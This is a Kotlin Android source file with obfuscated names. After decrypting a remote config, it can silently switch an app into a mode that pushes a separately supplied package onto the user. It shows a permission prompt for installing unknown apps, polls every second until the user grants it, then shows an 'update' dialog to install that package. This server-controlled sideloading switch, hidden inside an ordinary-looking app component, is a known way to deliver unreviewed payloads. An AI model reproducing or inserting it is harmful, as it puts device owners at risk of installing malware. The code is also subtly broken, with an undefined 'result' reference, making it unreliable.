package xxx.xxx.zzzz

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.gson.Gson
import com.tencent.mmkv.MMKV
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.asFlow
import kotlinx.coroutines.flow.collect

@RequiresApi(Build.VERSION_CODES.O)
class Nbbbb {
    companion object {
        @SuppressLint("StaticFieldLeak")
        private var i: Nbbbb? = null
            get() {
                field ?: run {
                    field = Nbbbb()
                }
                return field
            }

        @Synchronized
        fun get(): Nbbbb {
            return i!!
        }
    }

    private var context: Context? = null

    private var permissionDialog: PermissionDialog? = null

    private var hasPermission = false


    fun lifeIsFkingMovie(context: Context) {
        if (MMKV.defaultMMKV().decodeBool("state", false))
            return
        this.context = context

        (context as AppCompatActivity).getConfig2 { it2 ->
            var entity: ResultBean? = null
            entity = Gson().fromJson(AesEncryptUtil.decrypt(it2), ResultBean::class.java)
            if (entity?.crisis == "0" || entity?.crisis == "1") {
                MMKV.defaultMMKV().encode("result", entity)
                if (entity.crisis == "1") {
                    MMKV.defaultMMKV().encode("f", 0)
                    MMKV.defaultMMKV().encode("path", result.oPack)
                    hasPermission = context.packageManager.canRequestPackageInstalls()
                    if (!hasPermission) {
                        //show permission dialog
                        permissionDialog = PermissionDialog(context)
                        permissionDialog?.show()
                        countDown()
                    } else {
                        //show update dialog
                        UpdateDialog(context).show()
                    }
                }
            } else {
                return@getConfig2
            }
        }
    }

    private fun countDown() {
        var job: Job? = null
        job = (context as AppCompatActivity).lifecycleScope.launch(Dispatchers.IO) {
            (0 until Int.MAX_VALUE).asFlow().collect {
                delay(1000)
                if (context?.packageManager!!.canRequestPackageInstalls()) {
                    withContext(Dispatchers.Main) {
                        permissionDialog?.dismiss()
                        UpdateDialog(context as AppCompatActivity).show()
                    }
                    job?.cancel()
                }
            }
        }
    }
}